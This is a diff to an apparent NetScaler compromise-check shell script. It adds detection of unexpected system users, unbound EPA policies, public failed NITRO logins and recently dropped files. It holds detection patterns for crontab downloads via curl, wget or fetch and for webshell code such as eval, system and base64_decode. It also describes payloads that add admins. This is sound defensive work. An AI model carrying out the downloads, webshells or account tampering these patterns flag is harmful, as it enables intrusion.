+    SYSU=$(grep -E '^(add|bind) system user ' /nsconfig/ns.conf 2>/dev/null | awk '{print $4}' | tr -d '"' | grep -vx 'nsroot' | sort -u)
+    if [ -n "$SYSU" ]; then
+      warn "Local system users in ns.conf besides nsroot - confirm each one is yours (LevelBlue saw 'sec_monitor', Wiz a payload that adds an admin):"
+      for u in $SYSU; do
+        POL=$(grep -E "^bind system user \"?$u\"? " /nsconfig/ns.conf 2>/dev/null | awk '{print $5}' | tr -d '"' | sort -u | tr '\n' ' ')
+        GRP=$(grep -E "^bind system group [^ ]+ -userName \"?$u\"?( |\$)" /nsconfig/ns.conf 2>/dev/null | awk '{print $4}' | tr -d '"' | sort -u | tr '\n' ' ')
+        POL=$(echo $POL | sed 's/ /, /g'); GRP=$(echo $GRP | sed 's/ /, /g')
+        note "$u - policies: ${POL:-none}${GRP:+ - groups: $GRP}"
+      done
+      note "Also compare with 'show system user' on the CLI: an account added but not saved is not in ns.conf."
+      FOLLOWUP=1
+    else
+      okay "No local system users besides nsroot in ns.conf (also check 'show system user' for unsaved ones)"
+    fi
+    # C: when were they added? NetScaler keeps older saved configs (/nsconfig/ns.conf.0, .1, ...). A user that is
+    # not in an older copy was added after that copy was saved. Same for authentication/VPN policies with 'epa' in
+    # the name that were bound in an older copy and are no longer bound (the Wiz payload unbinds them).
+    OLDC=$(ls -t /nsconfig/ns.conf.* 2>/dev/null | while read -r c; do [ -f "$c" ] && grep -qE '^(#NS|set ns |add )' "$c" 2>/dev/null && echo "$c"; done)
+    if [ -n "$OLDC" ]; then
+      NEWU=""
+      for u in $SYSU; do
+        LASTW=""
+        for c in $OLDC; do
+          if grep -qE "^add system user \"?$u\"? " "$c" 2>/dev/null; then LASTW=""; else LASTW="$c"; break; fi
+        done
+        [ -n "$LASTW" ] && NEWU="$NEWU
+$u - not in $LASTW (saved $(fmtdate "$(mtime "$LASTW")")), so added after that"
+      done
+      [ -n "$NEWU" ] && { warn "System users added since an older saved config - check who added them and when:"; echo "$NEWU" | grep -v '^$' | show 10; FOLLOWUP=1; }
+      OLDEST=$(echo "$OLDC" | tail -1)
+      UNB=$(grep -iE '^bind (authentication vserver|authentication policylabel|vpn vserver) .*-polic(y|yName) "?[^ ]*epa' "$OLDEST" 2>/dev/null \
+            | while IFS= read -r l; do grep -qxF "$l" /nsconfig/ns.conf 2>/dev/null || echo "$l"; done | cut -c1-160)
+      [ -n "$UNB" ] && { warn "EPA policies bound in $OLDEST (saved $(fmtdate "$(mtime "$OLDEST")")) but no longer in ns.conf - confirm the change was yours (the Wiz payload unbinds them):"; echo "$UNB" | show 8; FOLLOWUP=1; }
+    fi
+    # v1.10 (craigsblackie root-cause analysis): CVE-2026-88771 is staged with a FAILED login to the unauthenticated
+    # NITRO API (POST /nitro/v1/config/login) - the username lands in ns.log. Failed management logins from public
+    # addresses mean the management interface (NSIP/SNIP with management access) is reachable from the internet.
+    if [ -n "$NLOGIN" ]; then
+      F=$(echo "$NLOGIN" | grep -aoE 'Remote_ip [0-9.]+' | awk '{print $2}' \
+          | grep -vE '^(10\.|127\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|169\.254\.)' | sort | uniq -c | sort -rn)
+      if [ -n "$F" ]; then
+        warn "Failed management/NITRO logins from public addresses in ns.log ($(echo "$F" | awk '{s+=$1} END{print s}') line(s), $(echo "$F" | grep -c .) address(es)) - the management interface is reachable from the internet:"
+        echo "$F" | awk '{print $2 " (" $1 " failed login(s))"}' | show 5
+        note "CVE-2026-88771 is staged through a failed NITRO login. Allow management access only from admin networks."
+        FOLLOWUP=1
+      fi
+    fi
+    # D: user and policy changes from the CLI audit log (ns.log CMD_EXECUTED). Normal admin work too, so [CHECK];
+    # Remote_ip 127.0.0.1 means the command came from a shell on the appliance itself, not from the GUI or SSH.
+    F=$(echo "$CMDL" | grep -aivE 'defaultEPAGroup[[:space:]]+"?NO_AUTH' | grep -av '^$')
+    if [ -n "$F" ]; then
+      warn "User, EPA and policy commands in the CLI audit log (ns.log) - confirm each was your admins ($(echo "$F" | grep -c .) line(s)):"
+      echo "$F" | bfirst | binsafe | cut -c1-240 | show 10
+      echo "$F" | grep -aq 'Remote_ip 127\.0\.0\.1' && note "Remote_ip 127.0.0.1 = run from a shell on the appliance (e.g. cli_script.sh), not from the GUI or SSH - typical for a payload."
+      FOLLOWUP=1
+    fi
     # v1.9 (Deyda v9.28): PHP / XHTML files under /var/netscaler outside the management GUI and websocketd,
     # with a content check. [CHECK]: customisations can be legitimate.
     F=$(find /var/netscaler -type f \( -name '*.php' -o -name '*.xhtml' \) ! -path '/var/netscaler/gui/admin_ui/*' ! -path '/var/netscaler/websocketd/*' 2>/dev/null | head -50)
@@ -1095,10 +1381,10 @@ ${tg}$(echo "$x" | cut -c1-16)... -> $d"
       [ -n "$H" ] && { note "Of these, webshell-like code (eval/system/passthru/base64_decode) in:"; echo "$H" | show 8; }
       FOLLOWUP=1
     fi
-    # Files changed in the last 3 days at the top of / and /var, and in /tmp and /var/tmp
+    # Files changed in the last $WINDAYS days (--days) at the top of / and /var, and in /tmp and /var/tmp
     # (where payloads drop files), minus NetScaler's own files and anything written at boot/upgrade
-    F=$( { find / /var -maxdepth 1 -type f -mtime -3 2>/dev/null
-           find /tmp /var/tmp -maxdepth 2 -type f -mtime -3 2>/dev/null; } \
+    F=$( { find / /var -maxdepth 1 -type f -mtime -$WINDAYS 2>/dev/null
+           find /tmp /var/tmp -maxdepth 2 -type f -mtime -$WINDAYS 2>/dev/null; } \
        | grep -vE '/var/tmp/(pitboss_check|gotham_ioc|support|ioc|ns_system_backup|\.shrun|ch_metrics|netscaler-ioc-check)|/tmp/(\.|pb\.sock|hostname\.txt|DIFF_)|\.(log|gz|lock|pid|sock)$|/var/tmp/par-[0-9a-f]+/|/tmp/_nsprofmon_tmp_file|/var/tmp/_tmp_(local|latest)_mapfile_digest|/tmp/machine\.counters\.list|/tmp/[0-9a-f]{8}\.(so|pl)$|/tmp/(GslbSync\.so|Config_git\.pl)$|^/var/(results[^/]*|ioc-script[^/]*|gotham_ioc[^/]*|\.monit\.state|\.monit\.id|ns_system_backup\.pl)$|/var/tmp/(install_pre_check\.json|_callhome_tmp_file)$|^/\.nscli_history$|ctx697096' \
        | while read -r x; do
            m=$(mtime "$x"); [ -n "$m" ] || continue
@@ -1115,9 +1401,9 @@ ${tg}$(echo "$x" | cut -c1-16)... -> $d"
            [ -n "$FWE" ] && [ "$m" -ge "$((FWE - 900))" ] && [ "$m" -le "$((FWE + 900))" ] && continue
            echo "$(fmtdate "$m")  $x"
          done | sort | head -30)
-    [ -n "$F" ] && { warn "Files changed in the last 3 days in / , /var (top level), /tmp or /var/tmp - payloads drop files here:"; echo "$F" | show 15
+    [ -n "$F" ] && { warn "Files changed in the last $WINDAYS days in / , /var (top level), /tmp or /var/tmp - payloads drop files here:"; echo "$F" | show 15
                      note "Expected: backups, Console/ADM scripts, client-package refreshes, your own tools. Anything else needs review."; FOLLOWUP=1; } \
-                || okay "No unexpected files changed in the last 3 days in / , /var, /tmp or /var/tmp"
+                || okay "No unexpected files changed in the last $WINDAYS days in / , /var, /tmp or /var/tmp"
     # Root crontab lines that download something
     F=$( { grep -hE 'curl|wget|fetch[[:space:]]' /etc/crontab 2>/dev/null; crontab -l 2>/dev/null | grep -E 'curl|wget|fetch[[:space:]]'; } | grep -v '^#' \
         | grep -vE '(curl|wget|fetch)[^|;&]*[[:space:]]"?(https?://)?(localhost|127\.0\.0\.1)([:/"[:space:]]|$)')
@@ -1172,6 +1458,14 @@ fi
 # ---------------------------------------------------------------------------
 # 5. Verdict
 # ---------------------------------------------------------------------------
+# v1.10: actual run time (also in the --summary line as runtime=) and what was checked
+RUNT=$(fmtdur $(( $(date +%s) - START )))
+if [ -n "$EXPT" ]; then
+  NHASH=$(echo $WS_HASHES $PL_HASHES | tr ' ' '\n' | sort -u | grep -c .)
+  echo "Done in $RUNT (expected $EXPT). Checked $NIP attacker IPs, $NDOM domains, $NHASH hashes and all public indicators up to $IOCDATE."
+else
+  echo "Done in $RUNT."
+fi
 echo "============================================================================"
 case "$VULN_BUILD" in
   yes|eol)
